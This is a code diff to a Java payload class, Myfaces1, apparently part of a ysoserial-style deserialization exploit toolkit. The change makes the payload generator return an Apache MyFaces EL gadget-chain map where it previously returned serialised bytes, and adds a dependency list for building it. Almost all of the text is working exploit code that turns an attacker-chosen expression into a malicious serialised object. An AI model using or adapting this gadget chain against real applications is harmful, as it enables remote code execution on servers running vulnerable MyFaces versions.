@@ -21,16 +21,35 @@ import java.io.ObjectOutputStream;
 
 public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies{
     @Override
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public Object getObject(PayloadType type, String... param) throws Exception {
         return makeExpressionPayload(param[0]);
     }
 
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+    public static String[] getDependencies() {
+        if (System.getProperty("el") == null || "apache".equals(System.getProperty("el"))) {
+            return new String[]{
+                    "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
+                    "org.mortbay.jasper:apache-el:8.0.27",
+                    "javax.servlet:javax.servlet-api:3.1.0",
+
+                    // deps for mocking the FacesContext
+                    "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
+            };
+        } else if ("juel".equals(System.getProperty("el"))) {
+            return new String[]{
+                    "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9",
+                    "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
+                    "javax.servlet:javax.servlet-api:3.1.0",
+
+                    // deps for mocking the FacesContext
+                    "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
+            };
+        }
+
+        throw new IllegalArgumentException("Invalid el type " + System.getProperty("el"));
     }
 
-    public static byte[] makeExpressionPayload(String expr) throws Exception {
+    public static Object makeExpressionPayload(String expr) throws Exception {
         FacesContextImpl fc        = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
         ELContext        elContext = new FacesELContext(new CompositeELResolver(), fc);
         Reflections.getField(FacesContextImplBase.class, "_elContext").set(fc, elContext);
@@ -41,12 +60,6 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies{
         ValueExpression                 ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
         ValueExpressionMethodExpression e2  = new ValueExpressionMethodExpression(ve2);
 
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(Gadgets.makeMap(e2, e));
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
+        return Gadgets.makeMap(e2, e);
     }
 }
